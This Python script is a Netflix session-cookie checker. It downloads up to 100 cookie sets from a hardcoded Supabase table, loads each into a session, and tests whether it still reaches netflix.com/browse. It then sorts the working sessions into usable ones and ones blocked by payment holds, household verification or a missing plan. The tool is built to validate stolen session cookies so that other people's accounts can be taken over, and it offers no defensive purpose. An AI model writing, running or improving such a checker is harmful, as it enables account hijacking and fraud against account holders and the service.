import requests
import json
import time

SUPABASE_URL = "https://arslamcjzixeqmalscye.supabase.co"
SUPABASE_KEY = "sb_publishable_VDYPdce8BVPg_J9kzFgKpA_dYAfDcP4"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
}

def check_basic(sess):
    cookies_data = sess.get('cookies')
    if not cookies_data: return False
    if isinstance(cookies_data, str):
        cookies_list = json.loads(cookies_data)
    else:
        cookies_list = cookies_data
    
    s = requests.Session()
    s.headers.update(HEADERS)
    for c in cookies_list:
        s.cookies.set(c['name'], c['value'], domain=c.get('domain', '.netflix.com'))
    
    try:
        resp = s.get("https://www.netflix.com/browse", timeout=10)
        final_url = resp.url
        if any(x in final_url for x in ["/browse", "/member", "/YourAccount"]):
            return True, final_url, resp.text
        return False, final_url, ""
    except:
        return False, "Error", ""

def main():
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    print("Fetching more cookies to find valid ones...")
    # Fetch 100 to increase chances
    response = requests.get(f"{SUPABASE_URL}/rest/v1/cookie_sessions?select=*&limit=100", headers=headers)
    sessions = response.json()
    
    valid_sessions = []
    for sess in sessions:
        is_val, url, html = check_basic(sess)
        if is_val:
            valid_sessions.append((sess, url, html))
            print(f"Found VALID: {sess.get('description')} -> {url}")
        else:
            print(f"Invalid: {sess.get('description')}")
            
    print(f"\nFound {len(valid_sessions)} valid sessions out of 100.")
    
    if not valid_sessions:
        return

    print("\nDEEP ANALYSIS OF VALID SESSIONS")
    print("="*50)
    for sess, url, html in valid_sessions:
        html_lower = html.lower()
        state = "Usable"
        if "update your payment" in html_lower or "account on hold" in html_lower:
            state = "FALSE POSITIVE: Payment Hold"
        elif "update your primary location" in html_lower or "household" in html_lower:
            state = "FALSE POSITIVE: Household Verification"
        elif "choose your plan" in html_lower:
            state = "FALSE POSITIVE: No Plan"
            
        print(f"Desc: {sess.get('description')}")
        print(f"URL: {url}")
        print(f"Result: {state}")
        print("-" * 30)

if __name__ == "__main__":
    main()
